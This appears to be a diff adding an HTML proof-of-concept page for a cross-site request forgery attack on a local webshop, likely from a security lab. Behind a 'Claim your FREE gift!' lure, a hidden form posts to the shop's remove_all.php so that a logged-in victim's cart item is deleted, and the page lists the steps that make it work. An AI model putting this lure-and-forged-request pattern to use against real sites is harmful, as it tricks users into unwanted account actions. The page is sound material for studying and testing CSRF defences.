@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Gift!</title>
+</head>
+<body>
+    <h1>Click here to claim your FREE gift!</h1>
+    
+    <form id="attack" action="http://localhost/webshop/webshop/remove_all.php" method="POST">
+        <input type="hidden" name="product_id" value="1">
+    </form>
+    
+    <button onclick="document.getElementById('attack').submit();">
+        Claim Free Gift!
+    </button>
+    
+    <p><strong>Instructions:</strong></p>
+    <ol>
+        <li>Make sure you're logged into the webshop</li>
+        <li>Add product ID 1 to your cart</li>
+        <li>Click the button above</li>
+        <li>You'll be redirected to cart.php and the product will be gone!</li>
+    </ol>
+</body>
+</html>
